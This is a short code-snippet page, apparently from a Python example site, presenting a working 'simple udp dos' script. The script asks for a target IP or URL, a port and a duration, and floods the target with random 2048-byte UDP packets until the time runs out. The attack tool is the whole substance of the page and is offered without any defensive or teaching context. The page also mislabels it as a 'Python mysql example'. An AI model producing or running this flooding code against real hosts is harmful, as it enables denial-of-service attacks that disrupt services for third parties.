---
title: python script simple udp dos (snippet)
date: 2020-03-03
tags: ["python"]
---
Python script 'simple udp dos'


Modules used in program: 
* `import random`
* `import socket`
* `import time`
* `import sys`
* `import os`

## python simple udp dos

Python mysql example: simple udp dos

```python
import os
import sys
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(2048)

print("This is a simple tool for udp dos.")

ip = raw_input("Target ip or url: ")
port = input("Port: ")
dur = input("Time: ")

timeout = time.time() + dur
sent = 0

while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
        sock.sendto(bytes, (ip, port))
        sent += 1
        print("Sent %s packets to %s" % (sent, ip))
    except KeyboardInterrupt:
        sys.exit()

```

## Python links

- Learn Python: https://pythonbasics.org/
- Python Tutorial: https://pythonspot.com
